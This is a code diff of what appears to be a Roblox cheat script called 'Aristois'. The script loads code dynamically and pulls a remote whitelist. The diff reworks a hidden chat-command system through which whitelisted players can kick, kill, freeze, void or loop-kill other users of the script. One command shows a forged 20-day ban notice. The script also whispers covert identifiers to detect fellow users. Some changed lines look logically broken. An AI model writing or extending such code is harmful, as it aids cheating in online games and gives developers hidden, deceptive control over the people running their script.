@@ -20,7 +20,7 @@ local WhitelistModule = loadstring(readfile("Aristois/Librarys/Whitelist.lua"))(
 local boxHandleAdornment = Instance.new("BoxHandleAdornment")
 local IsOnMobile = table.find({Enum.Platform.IOS, Enum.Platform.Android}, UserInputService:GetPlatform())
 local Whitelist = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://raw.githubusercontent.com/XzynAstralz/Whitelist/main/list.json"))
-print("updated in 11630038968.lua")
+
 local Table = {
     ChatStrings1 = {
         ["HYPE73WZNQRT5"] = "Aristois",
@@ -1499,19 +1499,26 @@ runcode(function()
 end)
 
 runcode(function()
-    local Section = Utility:CreateSection("AnitAfk", true)
+    local Section = Utility:CreateSection("AntiAfk", true)
+    local AntiAfkConnection
     local AnitAfk = Utility:CreateToggle({
-        Name = "Anit-AFK",
+        Name = "Anti-AFK",
         CurrentValue = false,
-        Flag = "AnitAfk",
+        Flag = "AntiAfk",
         Callback = function(callback)
             if callback then
-                lplr.Idled:Connect(function()
+                if AntiAfkConnection then
+                    AntiAfkConnection:Disconnect()
+                end
+                AntiAfkConnection = lplr.Idled:Connect(function()
                     VirtualUserService:CaptureController()
                     VirtualUserService:ClickButton2(Vector2.new())
                 end)
             else
-                lplr.Idled:Disconnect()
+                if AntiAfkConnection then
+                    AntiAfkConnection:Disconnect()
+                    AntiAfkConnection = nil
+                end
             end
         end
     })
@@ -1569,30 +1576,71 @@ runcode(function()
     })
 end)
 
+local whitelist = {
+    connection = nil,
+    players = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://raw.githubusercontent.com/XzynAstralz/Whitelist/main/list.json")),
+    loadedData = false,
+    sentMessages = {}
+}
+
+if not WhitelistModule or not WhitelistModule.checkstate and whitelist then return true end
+
+local cmdr = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextBox = Instance.new("TextBox")
+local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
+cmdr.Enabled = false
+cmdr.Name = "cmdr"
+cmdr.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+cmdr.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = cmdr
+Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BackgroundTransparency = 0.300
+Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0, 0, 0, -37)
+Frame.Size = UDim2.new(1, 0, 0, 30)
+
+TextBox.Parent = Frame
+TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.BackgroundTransparency = 1.000
+TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextBox.BorderSizePixel = 0
+TextBox.Position = UDim2.new(0, 0, -0.000999959302, 0)
+TextBox.Size = UDim2.new(1, 0, 0, 30)
+TextBox.Font = Enum.Font.FredokaOne
+TextBox.Text = ""
+TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.TextSize = 19.000
+
+UIAspectRatioConstraint.Parent = cmdr
+UIAspectRatioConstraint.AspectRatio = 2.364
+
 local commands = {
     [";ban default"] = function(player)
-        game:GetService("Players").LocalPlayer:Kick("You were kicked from this experience: You are temporarily banned from this experience. You will be unbanned in 20 days, 23 hours, and 50 minutes. Ban Reason: Exploiting, Autoclicking")
+        player:Kick("You were kicked from this experience: You are temporarily banned from this experience. You will be unbanned in 20 days, 23 hours, and 50 minutes. Ban Reason: Exploiting, Autoclicking")
     end,
     [";kick default"] = function(player)
-        game:GetService("Players").LocalPlayer:Kick("You were kicked.")
+        player:Kick("You were kicked.")
     end,
     [";kill default"] = function(player)
-        game:GetService("Players").LocalPlayer.Character:FindFirstChild("Humanoid").Health = 0
-        game:GetService("Players").LocalPlayer.character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
+        player.Character:FindFirstChild("Humanoid").Health = 0
+        player.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
     end,
     [";freeze default"] = function(player)
-        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Anchored = true
+        player.Character.HumanoidRootPart.Anchored = true
     end,
     [";unfreeze default"] = function(player)
-        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Anchored = false
+        player.Character.HumanoidRootPart.Anchored = false
     end,
     [";void default"] = function(player)
-        lplr.Character.HumanoidRootPart.CFrame = CFrame.new(lplr.Character.HumanoidRootPart.CFrame.Position + Vector3.new(0, 10000000, 0))
+        player.Character.HumanoidRootPart.CFrame = CFrame.new(player.Character.HumanoidRootPart.CFrame.Position + Vector3.new(0, 10000000, 0))
     end,
     [";loopkill default"] = function(player)
         RunLoops:BindToHeartbeat("kill", function(dt)
-            game:GetService("Players").LocalPlayer.Character:FindFirstChild("Humanoid").Health = 0
-            game:GetService("Players").LocalPlayer.character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
+            player.Character:FindFirstChild("Humanoid").Health = 0
+            player.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
         end)
     end,
     [";unloopkill default"] = function(player)
@@ -1610,43 +1658,20 @@ local commands = {
     [";rejoin default"] = function(player)
         game:GetService("TeleportService"):Teleport(game.PlaceId, player)
     end,
-    [";lagback default"] = function(player)
-        game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(99999, 99999, 99999)
-    end,
     [";reveal default"] = function(player)
         local message = "I am using Aristois"
         if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
             local newchannel = cloneref(game:GetService('RobloxReplicatedStorage')).ExperienceChat.WhisperChat:InvokeServer(player.UserId)
-            if newchannel and player ~= game:GetService("Players").LocalPlayer then
+            if newchannel and player ~= lplr then
                 newchannel:SendAsync(message)
             end
         elseif ReplicatedStorage:FindFirstChild('DefaultChatSystemChatEvents') then
-            if player ~= game:GetService("Players").LocalPlayer then
+            if player ~= lplr then
                 ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w " .. player.Name .. " " .. message, "All")
             end
         end
-    end,
+    end
 }
-
-local sentMessages = {}
-local function showCommands(player)
-    local tab = {}
-    for i,v in pairs(commands) do
-        table.insert(tab, i)
-    end
-    table.sort(tab)
-    local str = ""
-    for i,v in pairs(tab) do
-        str = str..v.."\n"
-    end
-    task.delay(1, function()
-        game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
-            Text =  str,
-            Color = Color3.fromRGB(255,65,65),
-            Font = Enum.Font.SourceSansBold,
-        })
-    end)
-end
 
 local function matchCommand(msg)
     local trimmedMsg = string.match(msg, "^%s*(.-)%s*$")
@@ -1667,69 +1692,94 @@ local function matchCommand(msg)
     return nil
 end
 
-local function handlePlayer(player)
-    local hashedCombined = WhitelistModule.hashUserIdAndUsername(player.UserId, player.Name)
+local function getBestMatch(text)
+    local bestMatch = nil
+    local matchCount = 0
+    for command, _ in pairs(commands) do
+        if command:sub(1, #text):lower() == text:lower() then
+            bestMatch = command:sub(#text + 1)
+            matchCount = matchCount + 1
+        end
+    end
+    return matchCount == 1 and bestMatch or nil
+end
 
-    if Whitelist[hashedCombined] then
-        if player ~= game:GetService("Players").LocalPlayer then
-            if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-                local newchannel = cloneref(game:GetService('RobloxReplicatedStorage')).ExperienceChat.WhisperChat:InvokeServer(player.UserId)
-                if newchannel and player ~= game:GetService("Players").LocalPlayer then
-                    for _, otherPlayer in pairs(game:GetService("Players"):GetPlayers()) do
-                        local otherHashedCombined = WhitelistModule.hashUserIdAndUsername(otherPlayer.UserId, otherPlayer.Name)
-                        if otherPlayer ~= player and Whitelist[otherHashedCombined] then
-                            return
-                        end
-                    end
-                    newchannel:SendAsync(Table.ChatStrings2.Aristois)
-                else
-                    ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Table.ChatStrings2.Aristois, "All")
-                end
-            elseif ReplicatedStorage:FindFirstChild('DefaultChatSystemChatEvents') then
-                if player ~= game:GetService("Players").LocalPlayer then
-                    for _, otherPlayer in pairs(game:GetService("Players"):GetPlayers()) do
-                        local otherHashedCombined = WhitelistModule.hashUserIdAndUsername(otherPlayer.UserId, otherPlayer.Name)
-                        if otherPlayer ~= player and Whitelist[otherHashedCombined] then
-                            return
-                        end
-                    end
-                    ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w " .. player.Name .. " " .. Table.ChatStrings2.Aristois, "All")
-                else
-                    ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Table.ChatStrings2.Aristois, "All")
-                end
+TextBox:GetPropertyChangedSignal("Text"):Connect(function()
+    local currentText = TextBox.Text
+    local bestMatch = getBestMatch(currentText)
+    if bestMatch then
+        TextBox.PlaceholderText = bestMatch
+    else
+        TextBox.PlaceholderText = ""
+    end
+end)
+
+local amIWhitelisted = WhitelistModule.checkstate(lplr)
+local function handlePlayer(player, PlayerAdded)
+    whitelist.loadedData = true
+    local hashedCombined = WhitelistModule.hashUserIdAndUsername(player.UserId, player.Name)
+    if PlayerAdded and whitelist.players[hashedCombined] and not amIWhitelisted then
+        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+            local newchannel = cloneref(game:GetService('RobloxReplicatedStorage')).ExperienceChat.WhisperChat:InvokeServer(player.UserId)
+            if newchannel and player ~= lplr then
+                newchannel:SendAsync(Table.ChatStrings2.Aristois)
+            end
+        elseif ReplicatedStorage:FindFirstChild('DefaultChatSystemChatEvents') then
+            if player ~= lplr then
+                ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w " .. player.Name .. " " .. Table.ChatStrings2.Aristois, "All")
             end
         end
-        
-        if player ~= game:GetService("Players").LocalPlayer then
-            player.Chatted:Connect(function(msg)
-                local lowerMsg = string.lower(msg)
-                local command = matchCommand(lowerMsg)
-                if command then
-                    local playerHashedCombined = WhitelistModule.hashUserIdAndUsername(player.UserId, player.Name)
-                    if not Whitelist[playerHashedCombined] then
-                        commands[command](player)
-                    end
-                end
-            end)
-        end
+        player.Chatted:Connect(function(msg)
+            local lowerMsg = string.lower(msg)
+            local command = matchCommand(lowerMsg)
+            if command and not amIWhitelisted then
+                commands[command](player)
+            end
+        end)
     end
 end
 
-game.Players.PlayerAdded:Connect(function(player)
-    handlePlayer(player)
-end)
-
-for _, player in ipairs(game.Players:GetPlayers()) do
-    handlePlayer(player)
+for _, player in ipairs(Players:GetPlayers()) do
+    handlePlayer(player, true)
 end
 
-if lplr then
-    local whitelisted = WhitelistModule.checkstate(lplr)
-    if whitelisted then
-        game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
-            local lowerMsg = string.lower(msg)
-            if lowerMsg == ";cmds" then
-                showCommands(lplr)
+TextBox.FocusLost:Connect(function(enterPressed)
+    if enterPressed then
+        local commandPart = TextBox.PlaceholderText
+        local command = TextBox.Text .. commandPart
+        local commandFunc = commands[command]
+        if commandFunc then
+            if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+                TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(command)
+            elseif ReplicatedStorage:FindFirstChild('DefaultChatSystemChatEvents') then
+                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(command, "All")
+            end
+        end
+        TextBox.Text = ""
+    end
+end)
+
+local CmdrVisible = false
+local whitelisted = WhitelistModule.checkstate(lplr)
+if not whitelist.connection then
+    whitelist.connection = Players.PlayerAdded:Connect(function(v) handlePlayer(v, true) end)
+    if whitelisted and whitelist.connection then
+        if whitelist.loadedData then task.wait() print("Data loaded successfully.") end
+        Players.PlayerRemoving:Connect(function(playerLeaving)
+            if whitelist.sentMessages[playerLeaving.UserId] then 
+                whitelist.sentMessages[playerLeaving.UserId] = nil
+            elseif not whitelist.connection then
+                return true
+            end
+        end)
+        local function toggleCmdrVisibility()
+            CmdrVisible = not CmdrVisible
+            cmdr.Enabled = CmdrVisible
+        end
+
+        UserInputService.InputBegan:Connect(function(input, isProcessed)
+            if not isProcessed and input.KeyCode == Enum.KeyCode.Delete then
+                toggleCmdrVisibility()
             end
         end)
         if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
@@ -1739,7 +1789,7 @@ if lplr then
                     local message = tab.Text
                     if speaker and string.find(tab.TextChannel.Name, "RBXWhisper") and string.find(message, Table.ChatStrings2.Aristois) then
                         local playerId = speaker.UserId
-                        if not sentMessages[playerId] then
+                        if not whitelist.sentMessages[playerId] then
                             WhitelistModule.AddExtraTag(speaker, "DEFAULT USER", Color3.fromRGB(255, 0, 0))
                             GuiLibrary:Notify({
                                 Title = "Aristois",
@@ -1755,7 +1805,7 @@ if lplr then
                                     },
                                 },
                             })
-                            sentMessages[playerId] = true
+                            whitelist.sentMessages[playerId] = true
                         end
                     end
                 end
@@ -1768,7 +1818,7 @@ if lplr then
                     local speaker, message = Players[messageData.FromSpeaker], messageData.Message
                     if messageData.MessageType == "Whisper" and message == Table.ChatStrings2.Aristois then
                         local playerId = speaker.UserId
-                        if not sentMessages[playerId] then
+                        if not whitelist.sentMessages[playerId] then
                             WhitelistModule.AddExtraTag(speaker, "DEFAULT USER", Color3.fromRGB(255, 0, 0))
                             print(messageData.FromSpeaker)
                             GuiLibrary:Notify({
@@ -1785,7 +1835,7 @@ if lplr then
                                     },
                                 },
                             })
-                            sentMessages[playerId] = true
+                            whitelist.sentMessages[playerId] = true
                         end
                     end
                 end)
@@ -1793,6 +1843,10 @@ if lplr then
         end
     end
 end
+
+Players.PlayerAdded:Connect(function()
+    WhitelistModule.UpdateTags()
+end)
 
 WhitelistModule.UpdateTags()
 GuiLibrary:LoadConfiguration()
